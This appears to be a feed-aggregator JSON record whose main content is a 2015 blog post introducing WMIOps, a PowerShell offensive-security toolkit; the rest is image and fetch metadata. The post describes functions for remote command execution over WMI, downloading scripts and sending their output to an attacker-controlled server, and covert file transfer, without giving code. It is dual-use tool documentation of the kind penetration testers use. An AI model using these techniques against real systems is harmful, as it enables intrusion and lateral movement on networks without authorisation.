know!</p>\n<p>&#160;</p>\n<p>&#160;</p>\n","descriptionType":"html","publishedDate":"Tue, 08 Dec 2015 16:04:48 +0000","feedId":11878,"bgimg":"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiexec.png","linkMd5":"89e5434a0fd3492e6ac4f5e7d2205305","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn3@2020_4/2020/08/25/01-41-06-769_3c3cd6365768570a.webp","destWidth":640,"destHeight":197,"sourceBytes":6858,"destBytes":13228,"author":"Christopher Truncer","articleImgCdnMap":{"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiexec.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn3@2020_4/2020/08/25/01-41-06-769_3c3cd6365768570a.webp","https://www.christophertruncer.com/wp-content/uploads/2015/12/notepadrunning.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn27@2020_5/2020/08/25/01-41-34-434_81ec9c5707669658.webp","https://www.christophertruncer.com/wp-content/uploads/2015/12/nettime.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn39@2020_4/2020/08/25/01-41-33-825_9b55122110805b4e.webp","https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobcli.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn44@2020_1/2020/08/25/01-41-33-905_aa4fc8d02b64a034.webp","https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobrunning.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn48@2020_1/2020/08/25/01-41-34-480_293de6fd9e2ce688.webp","https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiopsjobschedule.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn49@2020_6/2020/08/25/01-41-34-297_5823ae8dc2f38917.webp","https://www.christophertruncer.com/wp-content/uploads/2015/12/winrm.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn19@2020_2/2020/08/25/01-41-33-850_e34e8220aa56d5d1.webp","https://www.christophertruncer.com/wp-content/uploads/2015/12/usersactivecheck.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn23@2020_4/2020/08/25/01-41-33-824_c507f87d1e77a1ad.webp"},"publishedOrCreatedDate":1598319666308},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"Introducing WMIOps","link":"https://www.christophertruncer.com/?p=1181","description":"<p>Over the past year or two, I think everyone has seen an increasing use of WMI by attackers everywhere.  WMI is very interesting medium for carry out various actions across hosts on a network.  While for the most use cases you will need local administrative rights, once obtained you can easily query, search, and compromise remote machines all over WMI.  Matt Graeber <a href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf\">spoke</a> about using WMI for C2 at Blackhat and really sparked my interest.  He then went on to release <a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-WmiCommand.ps1\">Invoke-WmiCommand</a> which is a proof of concept script for executing powershell on a remote system and using WMI for its C2 channel.  After learning a  lot about how he implemented this, I decided to play around with WMI and see what actions I can do on remote systems over WMI and started working on WMIOps.</p>\n<p><strong>Github Repo: </strong><a href=\"https://github.com/ChrisTruncer/WMIOps\">https://github.com/ChrisTruncer/WMIOps</a></p>\n<p>Since that point about a month ago, I&#8217;ve got to a point where I am able to push out the initial version of WMI-Ops, written in powershell, which performs various actions over WMI on targeted machines.  Some of these functions are essentially wrappers for built-in powershell cmdlets, but were written because I find it easier to interact with them in this manner.  The functions included within the initial release of WMI-Ops, and a brief description of what they do are:</p>\n<ul>\n<li><strong>Invoke-ExecCommandWMI</strong> &#8211; This function will run any command you give it on the targeted system.  This will not return output of the command to the console.</li>\n<li><strong>Invoke-KillProcessWMI</strong> &#8211; This function is used to kill a process on a remote system via process ID or process name on the targeted system.</li>\n<li><strong>Get-RunningProcessesWMI</strong> &#8211; This function will return all running processes on the targeted machine.</li>\n<li><strong>Get-ProcessOwnersWMI</strong> &#8211; This function will return every user account that has a process running on the targeted system.</li>\n<li><strong>Find-ActiveUsersWMI </strong>&#8211; This function will attempt to determine if a user is currently active at the targeted system.  This works by checking to see if LogonUi.exe or a screen saver is currently running on the remote system.  If either process is running, I am assuming the user is not currently at their desktop.</li>\n<li><strong>Invoke-CreateShareandExecute</strong> &#8211; This function creates a network share on the local host.  A user-specified file is then copied into the share and permissions are set for both the file and the share to be accessible by Everyone.  Next, the function uses WMI to call/run the user specified file on the target machine and runs the file via UNC path.  This needs to be run from an elevated command/powershell prompt.</li>\n<li><strong>Invoke-RemoteScriptWithOutput</strong> &#8211; This function uses WMI to spawn powershell on a remote machine to download a user-specified powershell script (downloaded using IEX cradle), run the script and post back the function&#8217;s/script&#8217;s output over HTTPS to a user controlled server.</li>\n<li><strong>Find-UserSpecifiedFileWMI</strong> &#8211; This function takes a filename or extension and searches for the location of the file(s) on the remote system.  The path, along with additional information, is returned for any file(s) found matching the search string.</li>\n<li><strong>Invoke-FileTransferOverWMI</strong> &#8211; This function uses WMI to upload or download a file from the local system to the target system.  For uploads, the function reads the local file, base64 encodes it, and stores it in the local registry.  It then uses WMI to spawn powershell on the targeted system which connects back to the local system, reads registry value, base64 decodes it, and then writes it to a user specified location on the target system&#8217;s disk.</li>\n</ul>\n<p>This is essentially my first script I&#8217;ve developed in powershell, and I certainly expect to have many &#8220;learning moments&#8221; on more proper methods of developing these same functions in powershell, so please let me know if I&#8217;ve developed something improperly.</p>\n<p>Finally, I wouldn&#8217;t have been able to write this without the work of multiple other people who&#8217;s work I referenced throughout the writing of this script.  <a href=\"https://twitter.com/mattifestation\">Matt Graeber</a>, <a href=\"https://twitter.com/obscuresec\">Chris Campbell</a>, <a href=\"https://twitter.com/harmj0y\">Will Schroeder</a>, <a href=\"https://twitter.com/evan_pena2003\">Evan Pena</a>, <a href=\"https://twitter.com/sixdub\">Justin Warner</a>, <a href=\"https://twitter.com/enigma0x3\">Matt Nelson</a>, and <a href=\"https://twitter.com/xorrior\">Chris Ross</a>&#8216;s powershell work served as great references for how to write in powershell, and for working with WMI in powershell.  Thanks for all your guys work and ability to release it for others to use and reference.</p>\n","descriptionType":"html","publishedDate":"Fri, 20 Nov 2015 16:36:25 +0000","feedId":11878,"bgimg":"","linkMd5":"28cfc5f8b82d2ffbde54a1f8ffa7272e","bgimgJsdelivr":"","metaImg":"","author":"Christopher Truncer","publishedOrCreatedDate":1598319666308}],"record":{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","feedId":11878,"fetchDate":"Tue, 25 Aug 2020 01:41:06 +0000","fetchMs":1890,"handleMs":3117,"totalMs":34508,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"52.31.77.228","hostName":"europe-22.herokuapp.com","requestId":"de842dbb128948d0b107e093dbb2eba5_11878","contentType":"application/rss+xml; charset=UTF-8","totalBytes":2516314,"bgimgsTotal":6,"bgimgsGithubTotal":6,"articlesImgsTotal":21,"articlesImgsGithubTotal":21,"successGithubMap":{"myreaderx14":1,"myreaderx8":1,"myreaderx25":1,"myreaderx15":1,"myreaderx7":1,"myreaderx6":1,"myreaderx16":1,"myreaderx4":1,"myreaderx21":1,"myreaderx32":1,"myreaderx33":1,"myreaderx22":1,"myreaderx23":1,"myreaderx13":1,"myreaderx24":1,"myreaderx31":1,"myreaderx5oss":1,"myreaderx29":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1},"failGithubMap":{}},"feed":{"createdTime":"2020-08-25 04:37:08","updatedTime":"2020-08-25 04:37:08","id":11878,"name":"Christopher Truncer's Website","url":"https://www.christophertruncer.com/feed/","subscriber":null,"website":null,"icon":"https://www.christophertruncer.com/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn92@2020_2/2020/08/25/01-41-05-303_667612a7641aaf38.ico","description":"A Hacker's Perspective","weekly":null,"link":"https://www.christophertruncer.com"},"noPictureArticleList":[],"tmpCommonImgCdnBytes":1906472,"tmpBodyImgCdnBytes":609842,"tmpBgImgCdnBytes":0,"extra4":{"start":1598319661178,"total":0,"statList":[{"spend":2014,"msg":"获取xml内容"},{"spend":3117,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":2256,"msg":"正文链接上传到cdn"}]},"extra5":21,"extra6":21,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-53.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-039.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-007.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-015.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-60.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-011.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-019.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-023.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiexec.png","sourceStatusCode":200,"destWidth":640,"destHeight":197,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn3@2020_4/2020/08/25/01-41-06-769_3c3cd6365768570a.webp","sourceBytes":6858,"destBytes":13228,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1086,"convertSpendMs":17,"createdTime":"2020-08-25 09:41:06","host":"us-003*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305,89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.7 KB","destSize":"12.9 KB","compressRate":"192.9%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2016/05/xmlparse.png","sourceStatusCode":200,"destWidth":1184,"destHeight":250,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn16@2020_1/2020/08/25/01-41-06-787_d886cdf4f2911802.webp","sourceBytes":34441,"destBytes":32060,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1187,"convertSpendMs":18,"createdTime":"2020-08-25 09:41:06","host":"us-031*","referer":"https://www.christophertruncer.com/?p=1243","linkMd5ListStr":"3cac6fc91a04b45724f8ab9f936029df,3cac6fc91a04b45724f8ab9f936029df","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"33.6 KB","destSize":"31.3 KB","compressRate":"93.1%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/11/Egress-Assess-Supported-Malware.png","sourceStatusCode":200,"destWidth":1442,"destHeight":371,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn95@2020_5/2020/08/25/01-41-06-786_844004cb768c9343.webp","sourceBytes":31970,"destBytes":41192,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1288,"convertSpendMs":39,"createdTime":"2020-08-25 09:41:06","host":"us-027*","referer":"https://www.christophertruncer.com/?p=1174","linkMd5ListStr":"e3abfb85708b05c5c979cc6daf4d2bdb,e3abfb85708b05c5c979cc6daf4d2bdb","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.2 KB","destSize":"40.2 KB","compressRate":"128.8%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2016/05/scan.png","sourceStatusCode":200,"destWidth":1602,"destHeight":818,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn11@2020_1/2020/08/25/01-41-06-920_7c6addcb046d0a0a.webp","sourceBytes":100457,"destBytes":96296,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1428,"convertSpendMs":62,"createdTime":"2020-08-25 09:41:06","host":"us-53*","referer":"https://www.christophertruncer.com/?p=1249","linkMd5ListStr":"4e8722bf7c8e9c9510e0bca68e48d09c,4e8722bf7c8e9c9510e0bca68e48d09c","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"98.1 KB","destSize":"94 KB","compressRate":"95.9%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/09/Shell-Callback.png","sourceStatusCode":200,"destWidth":1190,"destHeight":154,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn8@2020_1/2020/08/25/01-41-07-469_7e1d2899c9da7bfb.webp","sourceBytes":76997,"destBytes":22796,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":2143,"convertSpendMs":13,"createdTime":"2020-08-25 09:41:06","host":"europe65*","referer":"https://www.christophertruncer.com/?p=1161","linkMd5ListStr":"56bd369ffdd75773fc68cbd563833d50,56bd369ffdd75773fc68cbd563833d50","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"75.2 KB","destSize":"22.3 KB","compressRate":"29.6%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2016/09/agscriptvid.gif","sourceStatusCode":200,"destWidth":960,"destHeight":600,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn99@2020_1/2020/08/25/01-41-31-952_5a83e67941230b90.webp","sourceBytes":5529394,"destBytes":1700900,"targetWebpQuality":67,"feedId":11878,"totalSpendMs":26931,"convertSpendMs":24669,"createdTime":"2020-08-25 09:41:06","host":"us-015*","referer":"https://www.christophertruncer.com/?p=1273","linkMd5ListStr":"1afa9dab30b5a0cbf018ceb762df5247,1afa9dab30b5a0cbf018ceb762df5247","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"5.3 MB","destSize":"1.6 MB","compressRate":"30.8%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/nettime.png","sourceStatusCode":200,"destWidth":451,"destHeight":65,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn39@2020_4/2020/08/25/01-41-33-825_9b55122110805b4e.webp","sourceBytes":2782,"destBytes":5242,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1000,"convertSpendMs":6,"createdTime":"2020-08-25 09:41:33","host":"us-023*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"2.7 KB","destSize":"5.1 KB","compressRate":"188.4%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/usersactivecheck.png","sourceStatusCode":200,"destWidth":642,"destHeight":89,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn23@2020_4/2020/08/25/01-41-33-824_c507f87d1e77a1ad.webp","sourceBytes":6451,"destBytes":12074,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1066,"convertSpendMs":6,"createdTime":"2020-08-25 09:41:33","host":"us-007*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.3 KB","destSize":"11.8 KB","compressRate":"187.2%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/09/Beacon-Listener.png","sourceStatusCode":200,"destWidth":712,"destHeight":470,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn35@2020_1/2020/08/25/01-41-33-853_f7d945412f641059.webp","sourceBytes":28852,"destBytes":24890,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1113,"convertSpendMs":18,"createdTime":"2020-08-25 09:41:33","host":"us-035*","referer":"https://www.christophertruncer.com/?p=1161","linkMd5ListStr":"56bd369ffdd75773fc68cbd563833d50","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"28.2 KB","destSize":"24.3 KB","compressRate":"86.3%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2016/09/text-1.png","sourceStatusCode":200,"destWidth":476,"destHeight":272,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn55@2020_3/2020/08/25/01-41-33-851_5907653b7f35177e.webp","sourceBytes":30690,"destBytes":11314,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1138,"convertSpendMs":11,"createdTime":"2020-08-25 09:41:33","host":"us-039*","referer":"https://www.christophertruncer.com/?p=1273","linkMd5ListStr":"1afa9dab30b5a0cbf018ceb762df5247","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30 KB","destSize":"11 KB","compressRate":"36.9%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2016/05/raikia.png","sourceStatusCode":200,"destWidth":1595,"destHeight":572,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn63@2020_3/2020/08/25/01-41-33-760_6a9577c1b880b096.webp","sourceBytes":75801,"destBytes":102938,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1255,"convertSpendMs":48,"createdTime":"2020-08-25 09:41:33","host":"us-015*","referer":"https://www.christophertruncer.com/?p=1249","linkMd5ListStr":"4e8722bf7c8e9c9510e0bca68e48d09c","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"74 KB","destSize":"100.5 KB","compressRate":"135.8%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/winrm.png","sourceStatusCode":200,"destWidth":643,"destHeight":210,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn19@2020_2/2020/08/25/01-41-33-850_e34e8220aa56d5d1.webp","sourceBytes":12795,"destBytes":23598,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1176,"convertSpendMs":27,"createdTime":"2020-08-25 09:41:33","host":"us-019*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"12.5 KB","destSize":"23 KB","compressRate":"184.4%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobcli.png","sourceStatusCode":200,"destWidth":449,"destHeight":39,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn44@2020_1/2020/08/25/01-41-33-905_aa4fc8d02b64a034.webp","sourceBytes":1816,"destBytes":3502,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1198,"convertSpendMs":5,"createdTime":"2020-08-25 09:41:33","host":"us-011*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1.8 KB","destSize":"3.4 KB","compressRate":"192.8%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/09/Beacon-Callback.png","sourceStatusCode":200,"destWidth":694,"destHeight":1200,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn60@2020_5/2020/08/25/01-41-33-934_34d7412656350589.webp","sourceBytes":240873,"destBytes":77204,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1384,"convertSpendMs":86,"createdTime":"2020-08-25 09:41:33","host":"us-027*","referer":"https://www.christophertruncer.com/?p=1161","linkMd5ListStr":"56bd369ffdd75773fc68cbd563833d50","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"235.2 KB","destSize":"75.4 KB","compressRate":"32.1%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2016/05/Raikiareport.png","sourceStatusCode":200,"destWidth":2833,"destHeight":1473,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn76@2020_5/2020/08/25/01-41-33-957_a2c0b25feace5940.webp","sourceBytes":194154,"destBytes":82226,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1473,"convertSpendMs":198,"createdTime":"2020-08-25 09:41:33","host":"us-53*","referer":"https://www.christophertruncer.com/?p=1249","linkMd5ListStr":"4e8722bf7c8e9c9510e0bca68e48d09c","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"189.6 KB","destSize":"80.3 KB","compressRate":"42.4%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/09/Powershell-One-Liner.png","sourceStatusCode":200,"destWidth":1196,"destHeight":208,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn72@2020_3/2020/08/25/01-41-34-238_f185d577c2a77d6a.webp","sourceBytes":64305,"destBytes":24752,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1877,"convertSpendMs":15,"createdTime":"2020-08-25 09:41:33","host":"europe65*","referer":"https://www.christophertruncer.com/?p=1161","linkMd5ListStr":"56bd369ffdd75773fc68cbd563833d50","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"62.8 KB","destSize":"24.2 KB","compressRate":"38.5%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/wmiopsjobschedule.png","sourceStatusCode":200,"destWidth":641,"destHeight":204,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn49@2020_6/2020/08/25/01-41-34-297_5823ae8dc2f38917.webp","sourceBytes":7507,"destBytes":12680,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1916,"convertSpendMs":10,"createdTime":"2020-08-25 09:41:33","host":"europe61*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.3 KB","destSize":"12.4 KB","compressRate":"168.9%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/notepadrunning.png","sourceStatusCode":200,"destWidth":409,"destHeight":457,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn27@2020_5/2020/08/25/01-41-34-434_81ec9c5707669658.webp","sourceBytes":52391,"destBytes":37988,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":2024,"convertSpendMs":12,"createdTime":"2020-08-25 09:41:33","host":"europe69*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"51.2 KB","destSize":"37.1 KB","compressRate":"72.5%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/12/atjobrunning.png","sourceStatusCode":200,"destWidth":409,"destHeight":457,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn48@2020_1/2020/08/25/01-41-34-480_293de6fd9e2ce688.webp","sourceBytes":47133,"destBytes":38880,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":2159,"convertSpendMs":16,"createdTime":"2020-08-25 09:41:33","host":"europe-60*","referer":"https://www.christophertruncer.com/?p=1208","linkMd5ListStr":"89e5434a0fd3492e6ac4f5e7d2205305","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46 KB","destSize":"38 KB","compressRate":"82.5%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2016/05/Datafile-Creds.png","sourceStatusCode":200,"destWidth":1114,"destHeight":866,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn68@2020_5/2020/08/25/01-41-34-621_5973096dc2b6bfa9.webp","sourceBytes":327549,"destBytes":116360,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":1793,"convertSpendMs":396,"createdTime":"2020-08-25 09:41:33","host":"us-003*","referer":"https://www.christophertruncer.com/?p=1249","linkMd5ListStr":"4e8722bf7c8e9c9510e0bca68e48d09c","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"319.9 KB","destSize":"113.6 KB","compressRate":"35.5%"},{"code":1,"isDone":false,"source":"https://www.christophertruncer.com/wp-content/uploads/2015/09/Powershell-Web-Delivery.png","sourceStatusCode":200,"destWidth":830,"destHeight":462,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn32@2020_3/2020/08/25/01-41-34-557_7b424b96105528ab.webp","sourceBytes":60801,"destBytes":36194,"targetWebpQuality":75,"feedId":11878,"totalSpendMs":2224,"convertSpendMs":23,"createdTime":"2020-08-25 09:41:33","host":"europe-57*","referer":"https://www.christophertruncer.com/?p=1161","linkMd5ListStr":"56bd369ffdd75773fc68cbd563833d50","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"59.4 KB","destSize":"35.3 KB","compressRate":"59.5%"}],"successGithubMap":{"myreaderx14":1,"myreaderx8":1,"myreaderx25":1,"myreaderx15":1,"myreaderx7":1,"myreaderx6":1,"myreaderx16":1,"myreaderx4":1,"myreaderx21":1,"myreaderx32":1,"myreaderx33":1,"myreaderx22":1,"myreaderx23":1,"myreaderx13":1,"myreaderx24":1,"myreaderx31":1,"myreaderx5oss":1,"myreaderx29":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1},"failGithubMap":{}}